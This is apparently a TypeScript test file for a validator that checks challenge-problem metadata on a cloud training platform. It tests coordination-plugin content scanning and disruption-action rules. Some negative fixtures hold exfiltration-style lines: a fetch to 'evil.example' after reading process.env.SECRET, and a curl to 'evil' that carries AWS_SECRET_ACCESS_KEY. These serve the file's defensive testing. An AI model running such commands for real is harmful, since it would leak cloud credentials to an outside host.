import { execSync } from "node:child_process";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import {
  checkDisruptionActionOutputRefs,
  checkDisruptionActions,
} from "../../../scripts/lib/disruption-action-check";
import { checkCoordinationPluginFile } from "../../../scripts/validate-problems";

/**
 * Issue #951 sub #2: validate-problems.ts の cross-ref check が壊れた問題 (=
 * scoring.flagOutputKey / endpoints[].key が template.yaml Outputs に無い等)
 * を実 deploy 前に止めることを保証する。
 *
 * checkCrossRefs のロジックは string-include で素朴。 本テストは
 *   (a) ロジック単位の境界条件を直接観察
 *   (b) 実 script を repo の現状で実行して全 problem が OK で返ることを E2E pin
 * の 2 段で守る。
 */

const REPO_ROOT = new URL("../../../", import.meta.url).pathname;
const VALIDATE_SCRIPT = join(REPO_ROOT, "scripts/validate-problems.ts");

describe("validate-problems cross-ref check (#951 sub #2)", () => {
  it("includes() should return true when flagOutputKey is present in template.yaml Outputs", () => {
    const yaml = `Outputs:\n  FlagValue:\n    Value: x\n`;
    expect(yaml.includes("FlagValue:")).toBe(true);
  });

  it("includes() should return false when flagOutputKey is missing from Outputs", () => {
    const yaml = `Outputs:\n  SomeOtherKey:\n    Value: x\n`;
    expect(yaml.includes("ThisKeyDoesNotExist:")).toBe(false);
  });

  it("should detect when endpoints[].default.key is missing in Outputs", () => {
    const yaml = `Outputs:\n  ServiceUrl:\n    Value: https://example.com\n`;
    expect(yaml.includes("NonExistent:")).toBe(false);
  });

  it("the real script (validate-problems.ts) should return OK on the repo's problems/", () => {
    const out = execSync(`bun run ${VALIDATE_SCRIPT}`, {
      encoding: "utf8",
      cwd: REPO_ROOT,
    });
    expect(out).toContain("件の metadata.json はすべて有効です");
  });
});

describe("checkCoordinationPluginFile (#1420)", () => {
  // microservice-migration-battle は interTeamCoordination.plugin=coordination/router.ts を宣言する
  // 唯一の参照問題 (submodule)。 実在 path での positive と、 不在 path での negative を pin する。
  const MS_DIR = join(REPO_ROOT, "problems/battles/microservice-migration-battle");

  it("should pass when the declared coordination plugin file exists", () => {
    expect(
      checkCoordinationPluginFile(
        { interTeamCoordination: { plugin: "coordination/router.ts" } },
        MS_DIR,
      ),
    ).toEqual([]);
  });

  it("should error when the coordination plugin file is missing", () => {
    const errors = checkCoordinationPluginFile(
      { interTeamCoordination: { plugin: "coordination/does-not-exist.ts" } },
      MS_DIR,
    );
    expect(errors).toHaveLength(1);
    expect(errors[0]).toContain("coordination/does-not-exist.ts");
  });

  it("should be a no-op when interTeamCoordination is absent", () => {
    expect(checkCoordinationPluginFile({}, MS_DIR)).toEqual([]);
  });

  it("should be a no-op when plugin is not a string", () => {
    expect(checkCoordinationPluginFile({ interTeamCoordination: {} }, MS_DIR)).toEqual([]);
  });
});

describe("checkCoordinationPluginFile content scan (ADR-030 S1 #1420)", () => {
  let dir: string;
  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), "coord-plugin-"));
    mkdirSync(join(dir, "coordination"), { recursive: true });
  });
  afterEach(() => rmSync(dir, { recursive: true, force: true }));

  function writePlugin(content: string): Record<string, unknown> {
    writeFileSync(join(dir, "coordination", "p.ts"), content);
    return { interTeamCoordination: { plugin: "coordination/p.ts" } };
  }

  it("should pass a side-effect-free pure reducer", () => {
    const meta = writePlugin(
      'import { defineCoordinationPlugin } from "@tenkacloud/coordination-plugin-sdk";\n' +
        "export default defineCoordinationPlugin({ initialState: () => ({}), " +
        "validateOp: () => ({ ok: true }), applyOp: (s) => s, projectForTeam: (s) => s });\n",
    );
    expect(checkCoordinationPluginFile(meta, dir)).toEqual([]);
  });

  it("should reject an @aws-sdk import (credential reach)", () => {
    const errs = checkCoordinationPluginFile(
      writePlugin('import { S3Client } from "@aws-sdk/client-s3";\n'),
      dir,
    );
    expect(errs).toHaveLength(1);
    expect(errs[0]).toContain("@aws-sdk import");
  });

  it("should reject node: builtins, process.env, and fetch()", () => {
    const errs = checkCoordinationPluginFile(
      writePlugin(
        'import { readFileSync } from "node:fs";\n' +
          "const s = process.env.SECRET;\n" +
          'await fetch("https://evil.example");\n',
      ),
      dir,
    );
    const joined = errs.join(" | ");
    expect(joined).toContain("node: builtin import");
    expect(joined).toContain("process.env access");
    expect(joined).toContain("fetch() call");
    expect(errs).toHaveLength(3);
  });
});

describe("checkDisruptionActions (ADR-031 #1419)", () => {
  const wellFormed = () => ({
    disruptions: [
      {
        id: "ec2-latency-injection",
        name: "latency",
        eventDetailType: "DegradedDisruptionFired",
        operatorEditable: ["afterMinutes"],
        parameters: { delayMs: 200, device: "eth0" },
        action: {
          kind: "ssm-run-command",
          targetRef: "WorkerInstanceIds",
          documentName: "AWS-RunShellScript",
          paramTemplate: {
            commands: ["tc qdisc add dev {{device}} root netem delay {{delayMs}}ms"],
          },
          revert: { afterSeconds: 600 },
        },
      },
    ],
  });

  it("should pass a well-formed action whose placeholders are all declared", () => {
    expect(checkDisruptionActions(wellFormed())).toEqual([]);
  });

  it("should be a no-op when a disruption declares no action (Phase A backward compat)", () => {
    expect(
      checkDisruptionActions({
        disruptions: [{ id: "x", name: "x", eventDetailType: "X" }],
      }),
    ).toEqual([]);
    expect(checkDisruptionActions({})).toEqual([]);
  });

  it("should reject a kind outside the allow-list", () => {
    const meta = wellFormed();
    meta.disruptions[0].action.kind = "rm-rf-everything";
    const errs = checkDisruptionActions(meta);
    expect(errs.some((e) => e.includes("action.kind must be one of"))).toBe(true);
  });

  it("should reject a missing / empty targetRef", () => {
    const meta = wellFormed();
    meta.disruptions[0].action.targetRef = "";
    expect(checkDisruptionActions(meta).some((e) => e.includes("targetRef"))).toBe(true);
  });

  it("should require a revert (ADR-029 INV-2: no disruption may be permanent)", () => {
    const meta = wellFormed();
    meta.disruptions[0].action.revert = undefined as unknown as { afterSeconds: number };
    const errs = checkDisruptionActions(meta);
    expect(errs.some((e) => e.includes("revert is required") && e.includes("INV-2"))).toBe(true);
  });

  it("should reject a non-positive or over-cap revert.afterSeconds", () => {
    const zero = wellFormed();
    zero.disruptions[0].action.revert = { afterSeconds: 0 };
    expect(
      checkDisruptionActions(zero).some((e) => e.includes("afterSeconds must be a positive")),
    ).toBe(true);
    const tooLong = wellFormed();
    tooLong.disruptions[0].action.revert = { afterSeconds: 24 * 60 * 60 + 1 };
    expect(checkDisruptionActions(tooLong).some((e) => e.includes("exceeds the"))).toBe(true);
  });

  it("should reject a paramTemplate placeholder not declared in parameters / operatorEditable", () => {
    const meta = wellFormed();
    meta.disruptions[0].action.paramTemplate = {
      commands: ["curl http://evil/{{AWS_SECRET_ACCESS_KEY}}"],
    };
    const errs = checkDisruptionActions(meta);
    expect(errs.some((e) => e.includes("{{AWS_SECRET_ACCESS_KEY}}"))).toBe(true);
  });

  it("should also scan revert.paramTemplate placeholders", () => {
    const meta = wellFormed();
    meta.disruptions[0].action.revert = {
      afterSeconds: 600,
      paramTemplate: { commands: ["echo {{undeclaredRevertKey}}"] },
    } as unknown as { afterSeconds: number };
    expect(checkDisruptionActions(meta).some((e) => e.includes("{{undeclaredRevertKey}}"))).toBe(
      true,
    );
  });

  it("should reject a non-object action", () => {
    const errs = checkDisruptionActions({
      disruptions: [{ id: "x", name: "x", eventDetailType: "X", action: "nope" }],
    });
    expect(errs.some((e) => e.includes("action must be an object"))).toBe(true);
  });
});

describe("checkDisruptionActionOutputRefs (ADR-031 #1419)", () => {
  const meta = {
    disruptions: [
      {
        id: "ec2-latency-injection",
        action: {
          kind: "ssm-run-command",
          targetRef: "WorkerInstanceIds",
          functionRef: "FaultFunctionName",
          revert: { afterSeconds: 600 },
        },
      },
    ],
  };

  it("should pass when targetRef + functionRef are present in template Outputs", () => {
    const yaml =
      "Outputs:\n  WorkerInstanceIds:\n    Value: x\n  FaultFunctionName:\n    Value: y\n";
    expect(checkDisruptionActionOutputRefs(meta, yaml, "template.yaml")).toEqual([]);
  });

  it("should report a targetRef that is not a CFn Output", () => {
    const yaml = "Outputs:\n  FaultFunctionName:\n    Value: y\n";
    const errs = checkDisruptionActionOutputRefs(meta, yaml, "template.yaml");
    expect(errs).toHaveLength(1);
    expect(errs[0]).toContain('targetRef="WorkerInstanceIds"');
  });

  it("should be a no-op when no disruption declares an action", () => {
    expect(
      checkDisruptionActionOutputRefs(
        { disruptions: [{ id: "x" }] },
        "Outputs:\n",
        "template.yaml",
      ),
    ).toEqual([]);
    expect(checkDisruptionActionOutputRefs({}, "Outputs:\n", "template.yaml")).toEqual([]);
  });
});
